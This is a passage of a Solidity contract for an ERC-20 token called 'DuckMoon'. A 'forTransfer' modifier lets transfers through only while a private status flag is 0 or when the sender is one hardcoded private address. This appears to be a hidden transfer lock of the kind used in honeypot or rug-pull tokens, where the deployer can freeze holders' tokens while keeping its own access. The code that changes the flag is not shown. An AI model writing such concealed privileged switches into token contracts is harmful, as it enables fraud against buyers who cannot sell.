...
contract DuckMoonToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenDM_totalSupply;
    uint256 private _tokenDM_status = 0;
    uint256 public stakingPoolDMStatus = 0;

    string private _tokenDM_name;
    string private _tokenDM_symbol;

    address private _poolDMAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenDM_name = "DuckMoon";
        _tokenDM_symbol = "DuckMoon";
        _tokenDM_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenDM_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolDMAddress || _tokenDM_status == 0);
        _;
    }
